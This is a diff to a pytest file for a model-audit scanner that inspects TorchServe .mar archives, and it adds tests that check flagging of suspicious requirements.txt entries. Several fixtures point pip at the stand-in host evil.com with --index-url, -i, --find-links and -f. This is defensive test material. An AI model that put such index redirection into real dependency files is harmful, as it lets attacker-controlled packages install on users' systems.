@@ -8,6 +8,8 @@ import zipfile
 from pathlib import Path
 from typing import Any
 
+import pytest
+
 from modelaudit import core
 from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.torchserve_mar_scanner import TorchServeMarScanner
@@ -51,6 +53,10 @@ def _build_malicious_pickle() -> bytes:
 
 def _failed_checks(result: ScanResult, check_name: str) -> list[Any]:
     return [check for check in result.checks if check.name == check_name and check.status == CheckStatus.FAILED]
+
+
+def _checks_named(result: ScanResult, check_name: str) -> list[Any]:
+    return [check for check in result.checks if check.name == check_name]
 
 
 def test_can_handle_valid_mar_archive(tmp_path: Path) -> None:
@@ -460,6 +466,52 @@ def test_scan_flags_non_pypi_requirements_index_as_critical(tmp_path: Path) -> N
     )
 
 
+def test_scan_flags_non_pypi_requirements_index_equals_form_as_critical(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"--index-url=https://evil.com/simple\nnumpy==1.26.4\n",
+        },
+        filename="requirements_evil_index_equals.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
+    assert any(
+        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_scan_flags_non_pypi_requirements_short_index_option_as_critical(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-i https://evil.com/simple\nnumpy==1.26.4\n",
+        },
+        filename="requirements_evil_index_short.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
+    assert any(
+        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
 def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_path = _create_mar_archive(
@@ -483,6 +535,39 @@ def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None
     assert "git_install" in reasons
 
 
+def test_scan_flags_remote_find_links_equals_and_short_forms_as_warning(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_equals_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"--find-links=https://evil.com/simple\nnumpy==1.26.4\n",
+        },
+        filename="requirements_find_links_equals.mar",
+    )
+    mar_short_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-f https://evil.com/simple\nnumpy==1.26.4\n",
+        },
+        filename="requirements_find_links_short.mar",
+    )
+
+    equals_result = TorchServeMarScanner().scan(str(mar_equals_path))
+    short_result = TorchServeMarScanner().scan(str(mar_short_path))
+
+    for result in (equals_result, short_result):
+        requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+        assert len(requirements_failures) == 1
+        reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
+        assert "remote_find_links" in reasons
+
+
 def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_path = _create_mar_archive(
@@ -497,9 +582,59 @@ def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
     )
 
     result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 1
+    assert requirements_checks[0].status == CheckStatus.PASSED
+
+
+def test_scan_accepts_local_find_links_and_pypi_short_index(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": (
+                b"-i https://pypi.org/simple\n"
+                b"--extra-index-url=https://files.pythonhosted.org/simple\n"
+                b"--find-links file:///opt/wheels\n"
+                b"numpy==1.26.4\n"
+            ),
+        },
+        filename="requirements_local_find_links.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 1
+    assert requirements_checks[0].status == CheckStatus.PASSED
+
+
+def test_scan_bounds_requirements_reads_to_dedicated_limit(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    monkeypatch.setattr(TorchServeMarScanner, "MAX_REQUIREMENTS_TXT_BYTES", 128)
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"a" * 129,
+        },
+        filename="requirements_oversized.mar",
+    )
+
+    result = TorchServeMarScanner(config={"max_mar_member_bytes": 1024 * 1024}).scan(str(mar_path))
     requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
 
-    assert len(requirements_failures) == 0
+    assert len(requirements_failures) == 1
+    assert "exceeds size limit" in requirements_failures[0].message
 
 
 def test_scan_without_requirements_txt_preserves_existing_behavior(tmp_path: Path) -> None:
